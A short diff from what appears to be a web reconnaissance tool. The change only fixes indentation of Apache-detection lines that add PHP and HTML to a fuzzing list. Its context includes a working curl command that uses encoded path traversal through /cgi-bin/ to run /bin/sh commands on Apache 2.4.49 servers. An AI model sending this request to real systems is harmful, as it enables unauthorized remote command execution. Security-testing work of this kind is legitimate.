@@ -117,9 +117,9 @@ def http_identify_server(host, port, proto='http'):
             server = server_header
 
         if ('Apache' in server_header):
-        printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
-        extensions.append('html')
-        extensions.append('php')
+            printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
+            extensions.append('html')
+            extensions.append('php')
 
         if '2.4.49' in server_header:
             cmd = f"curl {proto}://{host}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
